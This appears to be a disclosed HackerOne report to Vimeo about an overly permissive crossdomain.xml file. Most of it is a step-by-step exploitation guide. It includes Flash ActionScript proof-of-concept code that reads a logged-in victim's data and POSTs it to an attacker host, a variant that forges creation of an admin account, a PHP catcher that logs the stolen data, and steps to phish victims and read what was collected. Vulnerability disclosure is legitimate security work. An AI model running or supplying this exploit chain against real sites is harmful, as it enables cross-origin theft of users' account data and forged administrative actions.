@@ -1,0 +1,241 @@
+ReportLink:https://hackerone.com/reports/43070
+WeaknessName:Cryptographic Issues - Generic
+Reporter:https://hackerone.com/balag_py
+ReportedTo:Vimeo(vimeo)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:09.02.2015 17:32:04
+
+Summary:
+
+
+An overly permissive crossdomain.xml file on a domain that serves sensitive content is a major security risk. It exposes the domain hosting the improperly configured crossomain.xml file to information disclosure and request forgery. Attackers cannot only forge requests, they can read responses. This means the attacker can retrieve any information the authenticated user has access to, including account information, documents and files, and anti-CSRF tokens if they are used.
+
+URL : http://vimeo.com/crossdomain.xml
+=================================================================================
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
+<cross-domain-policy>
+    <site-control permitted-cross-domain-policies="by-content-type"/>
+    <allow-access-from domain="*" secure="false"/>
+    <allow-http-request-headers-from domain="*" headers="*"/>
+</cross-domain-policy>
+=================================================================================
+
+The Vulnerability
+==============
+As a general rule, if the following three conditions are met, there is problem:
+1. A crossdomain.xml file is hosted at the root of the host, for example: www.secret-site.com/crossdomain.xml.
+2. The crossdomain.xml is overly permissive.
+3. There is either sensitive information on www.secret-site.com or there are sensitive actions that can be performed on www.secret-site.com.
+
+If #1 and #2 are met, but www.secret-site.com does not contain any sensitive information, or does not include the ability to perform any sensitive actions, there is no risk to having a wide open crossdomain.xml file. There is no point in making a victim make a request to a page for you if the information is all public and you can see everything anyway.
+
+However, if there are sensitive actions that can be performed or information that can be stolen, and www.secret-site.com has an overly permissive crossdomain.xml file, the application at www.secret-site.com is essentially opening the door to any malicious SWF loaded from anywhere on the web. For example, a SWF loaded from www.malicious-site.com is now able to override/bypass Same Origin Policy and gain access to everything that the authorized user of www.secret-site.com has access to. To say this in a different way, the overly permissive crossdomain.xml file allows Flash to do things that even JavaScript is not allowed to do, mainly accessing cross domain resources.
+
+Note: The most permissive configuration option is the following line: <allow-access-from domain="*">. That is not the only overly permissive setting. Check out the reference papers listed above to find more.
+
+Note: API sites that require a pre-shared key are an exception to the conditions listed above.  In this case, even when all three conditions are met, if www.secret-site.com requires an API key or something similar to access the content, there is no risk. The attacker has no way of knowing the pre-shared secret API key, and therefore they can not forge a request with all of the required information to exploit the permissive crossdomain.xml.
+
+Note: In my examples, I use www as the hostname (www.secret-site.com).  The security implications of the crossdomain.xml are specific to the fully qualified domain name, including hostname and/or subdomain if they are present.  For example, if the https://www.secret-site.com/crossdomain.xml contains <allow-access-from domain="*">, but all of the sensitive transactions happen on https://secure.secret-site.com, there is no risk.  Of course, if https://secure.secret-site.com/crossdomain.xml exists and it also has an overly permissive policy, then we are back in business.  
+
+Exploitation
+==========
+And now the fun part. For the demo, I’m using Kali Linux. If you want to take advantage of the vulnerability described above, you need to modify and compile a SWF and host it on a web server.  The steps below show you how to do that, from start to finish. 
+
+1) Install Adobe Flex:
+===================================================
+apt-get install openjdk-6-jdk
+ mkdir /opt/flex 
+ cd /opt/flex/ 
+ wget http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip
+ unzip flex_sdk_4.6.zip 
+ chmod -R a+rx /opt/flex/
+ echo 'export PATH=/opt/flex/bin:$PATH' >> ~/.bashrc
+ chmod 755 bin/mxmlc
+===================================================
+
+2) Download Gursev’s exploit code (the .as and the .html files) from GitHub or copy/paste from his blog. In either case, you want to save the HTML into the web root (/var/www/crossdomain/xdx.html), and the AS file in a working folder outside of your web root (~/crossdomain/XDomainXploit.as) 
+==================================================
+mkdir /var/www/crossdomain
+ mkdir ~/crossdomain
+ cd ~
+ git clone https://github.com/gursev/flash-xdomain-xploit.git
+ cp flash-xdomain-xploit/xdx.html /var/www/crossdomain/
+ cp flash-xdomain-xploit/XDomainXploit.as ~/crossdomain/
+ vi ~/crossdomain/XDomainXploit.as
+=====================================================
+
+If for some reason you don't have the git client or the git command in the previous box doesn't work, you can use wget:
+=====================================================
+cd /var/www/crossdomain
+ wget https://raw.github.com/gursev/flash-xdomain-xploit/master/xdx.html  
+ cd ~/crossdomain
+ wget https://raw.github.com/gursev/flash-xdomain-xploit/master/XDomainXploit.as
+ vi ~/crossdomain/XDomainXploit.as
+======================================================
+
+3) Modify the ActionScript file to fit your needs. To make a basic GET request, Gursev's comments are self explanatory. You just replace the victim URL and the attacker URL.  My changes are highlighted in yellow.
+======================================================
+// POC Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)
+// XDomainXploit.as
+
+package {
+ import flash.display.Sprite;
+ import flash.events.*;
+ import flash.net.URLRequestMethod;
+ import flash.net.URLRequest;
+ import flash.net.URLLoader;
+
+ public class XDomainXploit extends Sprite {
+  public function XDomainXploit() {
+   // Target URL from where the data is to be retrieved
+   var readFrom:String = "http://www.secret-site.com/account/info";
+   var readRequest:URLRequest = new URLRequest(readFrom);
+   var getLoader:URLLoader = new URLLoader();
+   getLoader.addEventListener(Event.COMPLETE, eventHandler);
+   try {
+    getLoader.load(readRequest);
+   } catch (error:Error) {
+    trace("Error loading URL: " + error);
+   }
+  }
+
+  private function eventHandler(event:Event):void {
+   // URL to which retrieved data is to be sent
+   var sendTo:String = "http://malicious-site.com/catcher.php"
+   var sendRequest:URLRequest = new URLRequest(sendTo);
+   sendRequest.method = URLRequestMethod.POST;
+   sendRequest.data = event.target.data;
+   var sendLoader:URLLoader = new URLLoader();
+   try {
+    sendLoader.load(sendRequest);
+   } catch (error:Error) {
+    trace("Error loading URL: " + error);
+   }
+  }
+ }
+}
+=======================================================
+
+If you want to have the SWF make a POST request, of if you need to set a HTTP header, you can use my example below:
+=======================================================
+// POC Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)
+// POC Modified to send POSTs and append HTTP headers: Seth Art
+// XDomainXploit.as
+
+package {
+ import flash.display.Sprite;
+ import flash.events.*;
+ import flash.net.URLRequestMethod;
+ import flash.net.URLRequest;
+ import flash.net.URLLoader;
+ import flash.net.URLRequestHeader;
+ public class XDomainXploit3 extends Sprite {
+  public function XDomainXploit3() {
+   // Target URL from where the data is to be retrieved
+   var readFrom:String = "https://www.secret-site.com/admin/add";
+   var header:URLRequestHeader = new URLRequestHeader("Content-Type", "text/plain; charset=UTF-8");
+   var readRequest:URLRequest = new URLRequest(readFrom);
+   readRequest.method = URLRequestMethod.POST
+   readRequest.data = "{\"name\":\"CSRF-Admin\",\"Group\":\"admin\",\"password\":\"password\",\"confirmPassword\":\"password\"}";
+   readRequest.requestHeaders.push(header);
+   var getLoader:URLLoader = new URLLoader();
+   getLoader.addEventListener(Event.COMPLETE, eventHandler);
+   try {
+    getLoader.load(readRequest);
+   } catch (error:Error) {
+    trace("Error loading URL: " + error);
+   }
+  }
+
+  private function eventHandler(event:Event):void {
+   // URL to which retrieved data is to be sent
+   var sendTo:String = "http://www.malicious-site.com/crossdomain/catcher.php"
+   var sendRequest:URLRequest = new URLRequest(sendTo);
+   sendRequest.method = URLRequestMethod.POST;
+   sendRequest.data = event.target.data;
+   var sendLoader:URLLoader = new URLLoader();
+   try {
+    sendLoader.load(sendRequest);
+   } catch (error:Error) {
+    trace("Error loading URL: " + error);
+   }
+  }
+ }
+}
+========================================================
+
+4) Compile the ActionScript with xmmlc:
+========================================================
+ /opt/flex/bin/mxmlc ~/crossdomain/XDomainXploit.as
+========================================================
+
+5) Move the compiled SWF somewhere inside your web root
+========================================================
+mv ~/crossdomain/XDomainXploit.swf /var/www/crossdomain
+========================================================
+
+6) Create and save the catcher file. This php file takes the entire data portion of the incoming HTTP message and writes it to a file in /tmp. You can get a lot fancier with this, such as creating a separate file per victim, or by parsing the file within php and only writing the relevant information to disk.
+=========================================================
+vi /var/www/catcher.php
+
+<?php
+
+$data = file_get_contents("php://input");
+$ret = file_put_contents('/tmp/thanks_for_sharing.txt', $data, FILE_APPEND | LOCK_EX);
+if($ret === false) {
+ die('Error writing to file');
+}
+else { 
+ echo "$ret bytes written to file";
+}
+?>
+============================================================
+
+7) Install PHP if it is not already installed:
+============================================================
+ apt-get install php5
+============================================================
+
+8) Set your web server to support SSL.
+============================================================
+*This step is optional, but if your flash object is communicating with a HTTPS site, and the secure="false" attribute is not set, your flash object needs to have been loaded from a HTTPS site. 
+
+The two lines below show you how to make a self-signed cert(http://charles.lescampeurs.org/2012/01/14/ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate). For a more realistic POC, you would want to purchase a valid SSL certificate so your victim user does not get any SSL errors.
+=============================================================
+ make-ssl-cert generate-default-snakeoil --force-overwrite
+ a2enmod ssl
+ a2ensite default-ssl
+=============================================================
+
+9) Start [or restart] your web server
+=============================================================
+ /etc/init.d/apache2 restart
+=============================================================
+
+10) Phish your victim to your site, www.malicious-site.com/crossdomain/xdx.html
+
+11) Hope the victim is currently logged in to the www.secret-site.com
+
+12) Collect and analyze your stolen data:
+
+ cat /tmp/thanks_for_sharing.txt
+
+=====================================================================================
+
+
+Pls Read this following Articles for more Information : 
+===========================================
+http://sethsec.blogspot.in/2014/07/crossdomain-bing.html
+
+http://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html
+
+http://sethsec.blogspot.in/2014/11/crossdomainxml-can-be-overly-permissive_18.html?view=sidebar
+
+
+
+Regards,
+BALAJI
